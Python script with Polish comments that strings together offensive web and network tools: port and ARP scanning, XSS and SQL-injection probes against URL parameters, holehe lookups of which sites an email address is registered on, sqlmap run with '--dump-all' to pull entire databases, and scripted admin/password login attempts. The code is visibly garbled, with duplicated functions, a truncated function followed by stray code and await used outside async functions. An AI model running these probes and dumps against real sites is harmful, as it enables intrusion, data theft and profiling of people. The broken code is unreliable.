import socket
import aiohttp
import paramiko
import bs4
import holehe
import local_user_agent
import scapy.all as scapy
import subprocess
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

# Definiowanie funkcji pomocniczych

def get_ip_from_domain(domain):
    # Zwraca adres IP z nazwy domeny
    try:
        return socket.gethostbyname(domain)
    except socket.gaierror:
        return None

def scan_ports(ip, start, end):
    # Skanuje porty na podanym adresie IP w podanym zakresie
    # Zwraca listę otwartych portów
    open_ports = []
    for port in range(start, end + 1):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.1)
        result = s.connect_ex((ip, port))
        if result == 0:
            open_ports.append(port)
        s.close()
    return open_ports

async def test_website(url, session):
    # Testuje stronę internetową pod kątem podatności
    # Zwraca słownik z informacjami o stronie
    website_info = {}
    try:
        # Wykonanie żądania GET do strony
        response = await session.get(url)
        # Sprawdzenie statusu odpowiedzi
        website_info['status'] = response.status
        # Sprawdzenie nagłówków odpowiedzi
        website_info['headers'] = dict(response.headers)
        # Sprawdzenie zawartości strony
        website_info['content'] = await response.text()
        # Sprawdzenie podatności na XSS
        website_info['xss'] = await test_xss(url, session)
        # Sprawdzenie podatności na CSRF
        website_info['csrf'] = await test_csrf(url, session)
        # Sprawdzenie podatności na SQL Injection
        website_info['sql'] = await test_sql(url, session)
    except Exception as e:
        # Obsługa błędów
        website_info['error'] = str(e)
    return website_info

async def test_xss(url, session):
    # Testuje stronę internetową pod kątem podatności na XSS
    # Zwraca listę parametrów, które są podatne na XSS
    xss_vulnerable = []
    # Definiowanie skryptu, który ma być wstrzyknięty
    script = "<script>alert('XSS')</script>"
    # Sprawdzenie, czy url zawiera znak zapytania
    if "?" in url:
        # Podział url na bazę i parametry
        base, params = url.split("?", 1)
        # Podział parametrów na pary klucz-wartość
        params = params.split("&")
        # Iteracja po parametrach
        for param in params:
            # Podział parametru na klucz i wartość
            key, value = param.split("=")
            # Zastąpienie wartości skryptem
            new_param = key + "=" + script
            # Złożenie nowego url z nowym parametrem
            new_url = base + "?" + new_param
            # Wykonanie żądania GET do nowego url
            response = await session.get(new_url)
            # Sprawdzenie, czy skrypt jest obecny w odpowiedzi
            if script in await response.text():
                # Dodanie parametru do listy podatnych na XSS
                xss_vulnerable.append(param)
    return xss_vulnerable

async def test_csrf(url, session):
    # Testuje stronę internetową pod kątem podatności na CSRF
    # Zwraca prawdę lub fałsz
    csrf_vulnerable = False
    # Definiowanie fałszywego tokenu CSRF
    fake_token = "1234567890"
    # Sprawdzenie, czy url zawiera znak zapytania
    if "?" in url:
        # Podział url na bazę i parametry
        base, params = url.split("?", 1)
        # Podział parametrów na pary klucz-wartość
        params = params.split("&")
        # Iteracja po parametrach
        for param in params:
            # Podział parametru na klucz i wartość
            key, value = param.split("=")
            # Sprawdzenie, czy klucz jest podobny do tokenu CSRF
            if key.lower() in ["csrf", "csrf_token", "token", "authenticity_token"]:
                # Zastąpienie wartości fałszywym tokenem
                new_param = key + "=" + fake_token
                # Złożenie nowego url z nowym parametrem
                new_url = base + "?" + new_param
                # Wykonanie żądania GET do nowego url
                response = await session.get(new_url)
                # Sprawdzenie, czy odpowiedź jest poprawna
                if response.status == 200:
                    # Ustawienie flagi podatności na CSRF na prawdę
                    csrf_vulnerable = True
                    # Przerwanie pętli
                    break
    return csrf_vulnerable

async def test_sql(url, session):
    # Testuje stronę internetową pod kątem podatności na SQL Injection
    # Zwraca listę parametrów, które są podatne na SQL Injection
    sql_vulnerable = []
    # Definiowanie ładunku, który ma być wstrzyknięty
    payload = "' OR 1 = 1 --"
    # Sprawdzenie, czy url zawiera znak zapytania
    if "?" in url:
        # Podział url na bazę i parametry
        base, params = url.split("?", 1)
        # Podział parametrów na pary klucz-wartość
        params = params.split("&")
        # Iteracja po parametrach
        for param in params:
            # Podział parametru na klucz i wartość
            key, value = param.split("=")
            # Zastąpienie wartości ładunkiem
            new_param = key + "=" + payload
            # Złożenie nowego url z nowym parametrem
            new_url = base + "?" + new_param
            # Wykonanie żądania GET do nowego url
            response = await session.get(new_url)
            # Sprawdzenie, czy odpowiedź zawiera błąd SQL
            if "SQL" in await response.text():
                # Dodanie parametru do listy podatnych na SQL Injection
                sql_vulnerable.append(param)
    return sql_vulnerable

def get_content(url, session):
    # Pobiera zawartość strony internetowej
    # Zwraca tekst strony
    try:
        # Wykonanie żądania GET do strony
        response = await session.get(url)
        # Zwrócenie tekstu odpowiedzi
        return await response.text()
    except Exception as e:
        # Obsługa błędów
        return str(e)

def get_info_from_content(content):
    # Wyodrębnia informacje z zawartości strony internetowej
    # Zwraca słownik z informacjami
    info = {}
    # Utworzenie obiektu BeautifulSoup z zawartości
    soup = bs4.BeautifulSoup(content, "html.parser")
    # Sprawdzenie, czy strona ma tytuł
    if soup.title:
        # Dodanie tytułu do informacji
        info['title'] = soup.title.string
    # Sprawdzenie, czy strona ma meta tagi
    if soup.head:
        # Iteracja po meta tagach
        for meta in soup.head.find_all("meta"):
            # Sprawdzenie, czy meta tag ma atrybut name
            if meta.has_attr("name"):
                # Dodanie nazwy i treści meta tagu do informacji
                info[meta['name']] = meta['content']
    # Sprawdzenie, czy strona ma linki
    if soup.body:
        # Iteracja po linkach
        for link in soup.body.find_all("a"):
            # Sprawdzenie, czy link ma atrybut href
            if link.has_attr("href"):
                # Dodanie linku i tekstu do informacji
                info['link_' + link['href']] = link.text
    return info

def get_user_info(email):
    # Zbiera informacje o użytkowniku z mediów społecznościowych
    # Zwraca słownik z informacjami
    info = {}
    # Utworzenie obiektu Holehe
    holehe = holehe.core.holehe()
    # Iteracja po dostępnych platformach
    for platform in holehe.modules:
        # Wywołanie metody get z obiektu Holehe
        result = holehe.get(email, platform)
        # Sprawdzenie, czy wynik jest poprawny
        if result['found']:
            # Dodanie nazwy platformy i wyniku do informacji
            info[platform] = result
    return info

def get_random_user_agent():
    # Generuje losowy agent użytkownika
    # Zwraca ciąg znaków z agentem użytkownika
    # Utworzenie obiektu LocalUserAgent
    lua = local_user_agent.LocalUserAgent()
    # Wywołanie metody random z obiektu LocalUserAgent
    return lua.random()

def scan_network(ip, mask):
    # Skanuje sieć pod kątem aktywnych hostów
    # Zwraca listę adresów IP aktywnych hostów
    active_hosts = []
    # Utworzenie zakresu adresów IP z podanego adresu i maski
    ip_range = ip + "/" + mask
    # Wyodrębnia informacje z linków na stronie internetowej
# Zwraca listę słowników z informacjami o linkach
links_info = []
# Iteracja po linkach
for link in soup.body.find_all("a"):
    # Sprawdzenie, czy link ma atrybut href
    if link.has_attr("href"):
        # Utworzenie słownika z informacjami o linku
        link_info = {}
        # Dodanie adresu linku do informacji
        link_info['href'] = link['href']
        # Dodanie tekstu linku do informacji
        link_info['text'] = link.text
        # Dodanie informacji o linku do listy
        links_info.append(link_info)
# Dodanie informacji o linkach do informacji o stronie
info['links'] = links_info
return info

def get_user_info(email):
    # Zbiera informacje o użytkowniku z mediów społecznościowych
    # Zwraca słownik z informacjami
    user_info = {}
    try:
        # Wywołanie narzędzia Holehe z adresem email
        result = holehe.holehe(email)
        # Iteracja po wynikach
        for site, data in result.items():
            # Sprawdzenie, czy dane są dostępne
            if data['exists']:
                # Dodanie nazwy strony do informacji
                user_info[site] = {}
                # Dodanie danych do informacji
                for key, value in data['data'].items():
                    user_info[site][key] = value
    except Exception as e:
        # Obsługa błędów
        user_info['error'] = str(e)
    return user_info

def get_random_user_agent():
    # Generuje losowy agent użytkownika
    # Zwraca ciąg znaków z agentem użytkownika
    return local_user_agent.generate_user_agent()

async def scan_network(ip, mask):
    # Skanuje sieć pod kątem aktywnych hostów
    # Zwraca listę adresów IP aktywnych hostów
    active_hosts = []
    # Utworzenie zakresu adresów IP z podanego adresu i maski
    ip_range = ip + "/" + mask
    # Wykonanie skanowania ARP na podanym zakresie
    arp_result = await scapy.arping(ip_range, verbose=False)
    # Iteracja po wynikach
    for sent, received in arp_result[0]:
        # Dodanie adresu IP odbiorcy do listy aktywnych hostów
        active_hosts.append(received.psrc)
    return active_hosts

def run_sqlmap(url):
    # Uruchamia narzędzie SQLMap na podanej stronie internetowej
    # Zwraca wynik wykonania narzędzia
    try:
        # Wywołanie polecenia SQLMap z parametrami
        result = subprocess.run(["sqlmap", "-u", url, "--batch", "--dump-all"], capture_output=True, text=True)
        # Zwrócenie wyniku
        return result.stdout
    except Exception as e:
        # Obsługa błędów
        return str(e)

def automate_browser(url, driver):
    # Automatyzuje przeglądarkę internetową na podanej stronie
    # Zwraca prawdę lub fałsz w zależności od powodzenia operacji
    try:
        # Otworzenie strony internetowej
        driver.get(url)
        # Symulowanie interakcji użytkownika z elementami strony
        # Przykład: logowanie do strony
        # Znalezienie elementu z nazwą użytkownika
        username = driver.find_element_by_id("username")
        # Wpisanie nazwy użytkownika
        username.send_keys("admin")
        # Znalezienie elementu z hasłem
        password = driver.find_element_by_id("password")
        # Wpisanie hasła
        password.send_keys("password")
        # Znalezienie elementu z przyciskiem logowania
        login = driver.find_element_by_id("login")
        # Kliknięcie przycisku logowania
        login.click()
        # Oczekiwanie na załadowanie się strony
        wait = WebDriverWait(driver, 10)
        # Sprawdzenie, czy logowanie się powiodło
        success = wait.until(EC.presence_of_element_located((By.ID, "success")))
        # Zwrócenie prawdy
        return True
    except Exception as e:
        # Obsługa błędów
        return False

# Definiowanie głównej funkcji programu

async def main():
    # Utworzenie sesji asynchronicznej z losowym agentem użytkownika
    async with aiohttp.ClientSession(headers={"User-Agent": get_random_user_agent()}) as session:
        # Utworzenie sterownika przeglądarki internetowej
        driver = webdriver.Chrome()
        
        # Przykładowe użycie funkcji programu
        domain = "example.com"
        url = "http://example.com/login.php"
        email = "user@example.com"
        ip = "192.168.1.1"
        mask = "24"
        
        # Wyświetlenie adresu IP z nazwy domeny
        print(get_ip_from_domain(domain))
        
        # Wyświetlenie otwartych portów na adresie IP
        print(scan_ports(ip, 1, 1024))
        
        # Wyświetlenie informacji o stronie internetowej
        website_info = await test_website(url, session)
        print(website_info)
        
        # Wyświetlenie zawartości strony internetowej
        print(get_content(url, session))
        
        # Wyświetlenie informacji o użytkowniku
        print(get_user_info(email))
        
        # Wyświetlenie aktywnych hostów w sieci
        active_hosts = await scan_network(ip, mask)
        print(active_hosts)
        
        # Wyświetlenie wyniku uruchomienia SQLMap
        print(run_sqlmap(url))
        
        # Wyświetlenie wyniku automatyzacji przeglądarki
        print(automate_browser(url, driver))

# Wywołanie głównej funkcji programu
if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
